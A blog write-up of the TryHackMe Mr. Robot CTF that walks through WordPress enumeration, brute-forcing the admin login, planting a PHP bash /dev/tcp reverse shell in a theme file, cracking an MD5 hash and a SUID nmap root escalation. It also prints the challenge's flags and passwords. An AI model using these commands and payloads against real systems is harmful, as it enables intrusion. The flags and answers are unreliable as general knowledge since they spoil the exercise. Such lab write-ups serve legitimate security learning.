---
description: >-
  Zujiniale's writeup on the Mr. Robot CTF machine from TryHackMe, inspired by the popular TV show
title: TryHackMe - Mr. Robot CTF
date: 2024-12-17 00:00:00 -0600
categories: [Write-ups, TryHackMe]
tags: [thm, tryhackme, ctf, wordpress, privilege escalation, web exploitation, brute force]
show_image_post: false
#image: /assets/img/infocards/mr-robot-ctf.png
---

## TryHackMe - Mr. Robot CTF

## Overview

The Mr. Robot CTF is a beginner-to-intermediate level challenge inspired by the popular TV show. This machine features a WordPress-based website with three hidden flags. The path to root involves web enumeration, WordPress exploitation, and Linux privilege escalation through SUID binaries.

**Key Challenges:**
- Discovering hidden files through robots.txt
- WordPress user enumeration and brute-forcing
- Reverse shell upload via theme editor
- SUID binary privilege escalation

## Useful Skills and Tools

### robots.txt Enumeration
The `robots.txt` file often reveals sensitive directories or files that developers don't want indexed by search engines. Always check this file during web enumeration:
```bash
curl http://<target>/robots.txt
```

### WordPress Enumeration with WPScan
WPScan is an essential tool for WordPress security testing. It can enumerate users, plugins, themes, and known vulnerabilities:
```bash
wpscan --url http://<target> --enumerate u
```

### SUID Binary Exploitation
SUID (Set User ID) binaries run with the privileges of the file owner. Finding SUID binaries owned by root can lead to privilege escalation:
```bash
find / -perm -u=s -type f 2>/dev/null
```

## Enumeration

### Nmap Scan

I started my enumeration with an nmap scan of the target machine. The options I regularly use are:

| `Flag` | Purpose |
| :--- | :--- |
| `-p-` | A shortcut which tells nmap to scan all ports |
| `-vvv` | Gives very verbose output so I can see the results as they are found |
| `-sC` | Equivalent to `--script=default` and runs a collection of nmap enumeration scripts |
| `-sV` | Does a service version scan |
| `-oN $name` | Saves the output with a filename of `$name` |

```bash
nmap -sC -sV -oN nmap_scan <Target_IP>
```

**Key Findings:**
- **Port 80 (HTTP)**: Apache web server running
- **Port 443 (HTTPS)**: Secure HTTP service
- **Port 22 (SSH)**: OpenSSH (closed initially)

### Web Enumeration

Visiting the website at `http://<Target_IP>` revealed a Mr. Robot-themed interactive page. The initial page source didn't reveal much, so I proceeded to check `robots.txt`.

#### robots.txt Discovery

```bash
curl http://<Target_IP>/robots.txt
```

The `robots.txt` file contained two important entries:
- `fsocity.dic` - A wordlist for password brute-forcing
- `key-1-of-3.txt` - The first flag

Downloaded both files:
```bash
wget http://<Target_IP>/fsocity.dic
wget http://<Target_IP>/key-1-of-3.txt
```

**Flag 1:** `073403c8a58a1f80d943455fb30724b9`

### Directory Brute-Forcing

I used Gobuster to discover hidden directories and files:

```bash
gobuster dir -u http://<Target_IP> -w /usr/share/wordlists/dirb/common.txt -t 50
```

**Key Discoveries:**
- `/wp-admin` - WordPress admin panel
- `/wp-login.php` - WordPress login page
- `/wp-content` - WordPress content directory

This confirmed the site is running **WordPress**, a popular CMS with known attack vectors.

### WordPress Enumeration

Using WPScan to enumerate WordPress users:

```bash
wpscan --url http://<Target_IP> --enumerate u
```

**Found user:** `Elliot` (named after the main character from the show)

## Initial Foothold

### Brute-Forcing WordPress Login

With the username `Elliot` identified and the `fsocity.dic` wordlist from robots.txt, I proceeded to brute-force the login:

```bash
wpscan --url http://<Target_IP> --wordlist fsocity.dic --username Elliot
```

**Credentials found:** `Elliot:ER28-0652`

### Uploading Reverse Shell

After logging into WordPress at `http://<Target_IP>/wp-login.php`, I navigated to:
- **Appearance → Theme Editor**
- Selected the `404.php` template file

I replaced the contents with a PHP reverse shell (using Pentestmonkey's reverse shell):

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<Your_IP>/<Your_Port> 0>&1'");
?>
```

Set up a Netcat listener on my attacking machine:

```bash
nc -lvnp 4444
```

Triggered the reverse shell by visiting:
```
http://<Target_IP>/wp-content/themes/twentyfifteen/404.php
```

**Shell acquired as:** `daemon` user

## Road to User

### Further Enumeration

After gaining initial access, I explored the system:

```bash
whoami          # daemon
hostname        # linux
uname -a        # Linux 3.13.0-55-generic
```

### Finding User Credentials

Explored the `/home` directory and found a user named `robot`:

```bash
cd /home/robot
ls -la
```

Found two files:
- `key-2-of-3.txt` (readable only by user `robot`)
- `password.raw-md5` (world-readable)

The `password.raw-md5` file contained:
```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Cracked the MD5 hash using online tools or hashcat:
```bash
hashcat -m 0 c3fcd3d76192e4007dfb496cca67e13b /usr/share/wordlists/rockyou.txt
```

**Password:** `abcdefghijklmnopqrstuvwxyz`

### User.txt

Switched to the `robot` user:

```bash
su robot
# Password: abcdefghijklmnopqrstuvwxyz
```

Retrieved the second flag:
```bash
cat /home/robot/key-2-of-3.txt
```

**Flag 2:** `822c73956184f694993bede3eb39f959`

## Path to Power (Gaining Administrator Access)

### Enumeration as User `robot`

Searched for SUID binaries that could be exploited for privilege escalation:

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Key finding:** `/usr/local/bin/nmap` had the SUID bit set

### Exploiting SUID Nmap

Older versions of nmap (< 5.21) have an interactive mode that can spawn a shell. Since nmap has SUID set and is owned by root, this shell will run with root privileges:

```bash
nmap --interactive
```

Once in nmap's interactive mode:
```
nmap> !sh
```

This spawned a root shell.

### Root.txt

With root access, I retrieved the final flag:

```bash
whoami          # root
cd /root
cat key-3-of-3.txt
```

**Flag 3:** `04787ddef27c3dee1ee161b21670b4e4`

## Summary

This machine provided excellent practice in:
1. **Web enumeration** - robots.txt, directory brute-forcing
2. **WordPress exploitation** - user enumeration, brute-forcing, theme file upload
3. **Privilege escalation** - MD5 hash cracking, SUID binary exploitation

The three flags captured:
- **Flag 1:** Found in robots.txt
- **Flag 2:** Retrieved as user `robot` 
- **Flag 3:** Retrieved with root access

Thanks to [Leon Johnson](https://tryhackme.com/p/leonjza) for creating this entertaining and educational CTF challenge!

---

> _Note: AI-assisted editing was used to improve grammar, clarity, and formatting. All technical content and opinions are original._
